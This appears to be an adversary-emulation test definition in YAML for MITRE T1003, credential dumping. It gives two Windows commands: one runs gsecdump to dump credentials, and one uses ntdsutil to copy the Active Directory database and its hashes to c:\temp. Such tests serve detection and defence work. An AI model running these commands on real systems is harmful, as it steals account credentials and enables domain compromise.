raw_yaml:
attack_technique: T1003
display_name: OS Credential Dumping
atomic_tests:
- name: Credential Dumping with gsecdump
  description: |
    Uses gsecdump to dump credentials on Windows.
  supported_platforms: [windows]
  executor:
    command: |
      gsecdump -a
    name: command_prompt
- name: Credential Dumping with Ntdsutil
  description: |
    Dumps Active Directory hashes using ntdsutil.
  supported_platforms: [windows]
  executor:
    command: |
      ntdsutil "activate instance ntds" "ifm" "create full c:\temp" quit quit
    name: command_prompt
